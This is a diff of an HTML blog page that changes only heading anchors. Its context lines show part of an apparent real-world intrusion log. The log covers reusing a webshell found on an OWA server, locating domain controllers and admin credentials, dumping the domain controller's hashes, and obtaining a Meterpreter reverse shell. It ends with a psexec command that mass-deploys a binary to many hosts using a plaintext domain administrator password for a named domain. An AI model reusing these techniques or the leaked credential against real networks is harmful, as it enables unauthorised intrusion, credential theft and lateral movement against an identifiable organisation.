@@ -129,7 +129,7 @@
 
         
 
-        <span itemprop="articleBody"><h3 id="x01-upload-backup-webshells">0x01 upload backup webshells</h3>
+        <span itemprop="articleBody"><h3 id="0x01-upload-backup-webshells">0x01 upload backup webshells</h3>
 
 <div class="highlighter-rouge"><pre class="highlight"><code>1.there exists a webshell upload by someone else:https://xx.oo.xx/owa/auth/error1.aspx
 2.webshell in different folder has different privileges
@@ -159,7 +159,7 @@
 </code></pre>
 </div>
 
-<h3 id="x02-find-domain-controllers-and-dc-administrator-username--password">0x02 find domain controllers and dc administrator username &amp; password</h3>
+<h3 id="0x02-find-domain-controllers-and-dc-administrator-username--password">0x02 find domain controllers and dc administrator username &amp; password</h3>
 <div class="highlighter-rouge"><pre class="highlight"><code>https://drops.wooyun.org/tips/421 
     dsquery server(best)
     nslookup -type=SRV _ldap._tcp.baidu.com(baidu.com is a domain name,others should be like xxx.org.xx)
@@ -176,7 +176,7 @@ d:\1.bat:
 </code></pre>
 </div>
 
-<h3 id="x03-get-all-hashs-in-the-domain-controllers-machine">0x03 get all hashs in the domain controllers machine</h3>
+<h3 id="0x03-get-all-hashs-in-the-domain-controllers-machine">0x03 get all hashs in the domain controllers machine</h3>
 <div class="highlighter-rouge"><pre class="highlight"><code>link a:
     https://drops.wooyun.org/tips/6617
 link b:
@@ -201,7 +201,7 @@ step3:
 </code></pre>
 </div>
 
-<h3 id="x04-get-a-meterpreter-reverse-shell">0x04 get a meterpreter reverse shell</h3>
+<h3 id="0x04-get-a-meterpreter-reverse-shell">0x04 get a meterpreter reverse shell</h3>
 <div class="highlighter-rouge"><pre class="highlight"><code>1.found windows firewall is not open on the target,but "in/out rules exists"
 2.found reverse port like 200 can not get it successfully
 3.can not find why the meterpreter shell can not reverse connecting msf successfully
@@ -214,7 +214,7 @@ step3:
 </code></pre>
 </div>
 
-<h3 id="x05-">0x05 批量种马</h3>
+<h3 id="0x05-批量种马">0x05 批量种马</h3>
 <div class="highlighter-rouge"><pre class="highlight"><code>1&gt;psexec.exe @pc.txt -u ABIMAQ\Administrator -p k78m90 -c c:\recycler\putty.exe
 2&gt;msf
     use exploit/windows/smb/psexec
